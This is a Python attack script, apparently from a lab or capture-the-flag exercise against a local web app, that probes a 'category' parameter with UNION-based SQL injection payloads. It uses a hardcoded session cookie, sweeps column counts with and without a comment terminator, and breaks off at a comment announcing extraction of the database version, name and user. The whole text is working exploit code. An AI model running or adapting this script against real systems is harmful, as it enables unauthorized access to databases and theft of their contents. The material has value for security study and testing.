import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] UNION-based SQL Injection Data Extraction")
print(f"[+] Target: {target}")

# Get full normal response for comparison
r_normal = session.get(target + "?category=Nature")
normal_full = r_normal.text
normal_size = len(normal_full)
print(f"[+] Normal response: {normal_size} bytes")

# Test each UNION payload and examine full response
union_payloads = []

print("\n[+] Phase 1: Finding correct column count with UNION #")
for cols in range(1, 10):
    # Create payload: select 1,2,3,... for each column count
    select_clause = ','.join([str(i) for i in range(1, cols+1)])
    payload = f"Nature' UNION SELECT {select_clause}#"
    
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    response_text = r.text
    size = len(response_text)
    
    print(f"[+] Columns={cols}: {size} bytes")
    
    # Check if response contains UNION data
    # Look for numbers 1,2,3... in the response
    if any(str(i) in response_text for i in range(1, cols+1)):
        print(f"[!] UNION data detected in response!")
        print(f"[!] Response:\n{response_text[:1000]}")
        union_payloads.append((cols, payload, response_text))
        break
    elif size != normal_size and size < normal_size:
        # Different but truncated - may still contain data
        print(f"[!] Response size differs - checking content...")
        print(f"[!] Snippet: {response_text[:500]}")
        union_payloads.append((cols, payload, response_text))

if not union_payloads:
    print("[-] No successful UNION with # found")
    # Try different syntax
    print("\n[+] Trying UNION without comments")
    for cols in range(1, 10):
        select_clause = ','.join([str(i) for i in range(1, cols+1)])
        payload = f"Nature' UNION SELECT {select_clause}"
        
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        response_text = r.text
        size = len(response_text)
        
        print(f"[+] Columns={cols}: {size} bytes")
        if any(str(i) in response_text for i in range(1, cols+1)):
            print(f"[!] UNION data detected!")
            union_payloads.append((cols, payload, response_text))
            break

if union_payloads:
    cols, working_payload, response = union_payloads[0]
    print(f"\n[!] Working column count: {cols}")
    print(f"[!] Working payload: {working_payload}")
    
    # Phase 2: Extract database information
    print(f"\n[+] Phase 2: Extracting database info with {cols} columns")
    
    # Try to get MySQL version, database name, user
